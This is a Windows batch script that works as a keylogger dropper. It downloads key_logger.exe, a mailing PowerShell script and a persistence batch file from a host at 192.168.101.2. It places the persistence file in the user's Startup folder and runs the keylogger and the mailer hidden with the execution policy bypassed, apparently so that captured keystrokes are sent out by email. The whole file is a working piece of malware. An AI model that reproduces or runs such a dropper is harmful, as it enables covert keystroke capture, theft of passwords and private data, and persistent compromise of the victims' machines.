@echo off
setlocal

set "URL=http://192.168.101.2:80"

set "fileTemp=%env:TEMP%"
set "fileStartup=C:\Users\Acer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

start powershell -Command "Invoke-Webrequest -Uri %URL%/key_logger.exe -OutFile $env:TEMP\logger.exe"
start powershell -Command "Invoke-Webrequest -Uri %URL%/ps_mail.ps1 -OutFile $env:TEMP\ps_mail.ps1"
start powershell -Command "Invoke-Webrequest -Uri %URL%/Record.txt -OutFile $env:TEMP\Record.txt"
start powershell -Command "Invoke-Webrequest -Uri %URL%/persistent.bat -OutFile '%fileStartup%\persistent.bat'"

timeout /t 1 /nobreak

start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\logger.exe"

start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\ps_mail.ps1"

endlocal
